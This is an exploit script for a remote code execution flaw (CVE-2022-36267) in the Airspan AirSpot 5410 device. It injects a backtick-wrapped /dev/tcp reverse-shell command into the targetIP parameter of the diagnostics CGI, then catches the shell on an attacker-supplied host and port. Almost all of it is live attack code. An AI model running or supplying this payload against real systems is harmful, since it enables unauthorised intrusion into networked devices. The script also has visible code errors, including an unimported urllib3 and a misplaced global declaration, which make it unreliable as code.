# Exploit Title: Airspan AirSpot 5410 version 0.3.4.1 - Remote Code Execution (RCE)
# Date: 7/26/2022
# Exploit Author: Samy Younsi (NSLABS) (https://samy.link)
# Vendor Homepage: https://www.airspan.com/
# Software Link: https://wdi.rfwel.com/cdn/techdocs/AirSpot5410.pdf
# Version: 0.3.4.1-4 and under.
# Tested on: Airspan AirSpot 5410 version 0.3.4.1-4 (Ubuntu)
# CVE : CVE-2022-36267
from sky.tools import shell
import requests

urllib3.disable_warnings()

ARGS = ['RHOST','RPORT','LHOST','LPORT','TYPE']

def exploit(param):
  payload = '`sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261`'.format(param['LHOST'], param['LPORT'])
  data = 'Command=pingDiagnostic&targetIP=1.1.1.1{}&packetSize=55&timeOut=10&count=1'.format(payload)

  try:
    response = requests.post('http://{}:{}/cgi-bin/diagnostics.cgi'.format(param['RHOST'], param['RPORT']), data=data, verify=False)
    return shell.reverse_shell(param)
  except Exception as ex:
    try:
      response = requests.post('https://{}:{}/cgi-bin/diagnostics.cgi'.format(param['RHOST'], param['RPORT']), data=data, verify=False)
      return shell.reverse_shell(param)
    except Exception as ex:
      return False


def auto_args(param):
  global param
  param['TYPE'] = 'reverse_shell'
  
